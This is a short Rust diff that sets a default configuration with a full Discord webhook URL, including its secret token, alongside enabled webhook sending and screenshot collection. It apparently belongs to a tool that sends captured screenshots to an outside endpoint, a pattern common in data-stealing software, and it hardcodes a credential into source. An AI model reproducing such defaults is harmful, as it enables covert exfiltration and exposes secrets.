@@ -28,7 +28,7 @@ impl Default for Config {
     fn default() -> Self {
         Config {
             timeout_seconds: 45,
-            webhook_url: "".to_string(),
+            webhook_url: "https://discord.com/api/webhooks/1418989059262386238/KI35x38t0aw6yiMsM9h1_k1ypJQXg_aBK8JaYziXyto9XlnrSGydc1qkmnDf1tbNDVA9".to_string(),
             webhook_type: "Discord".to_string(),
             webhook_enabled: true,
             collect_screenshots: true,
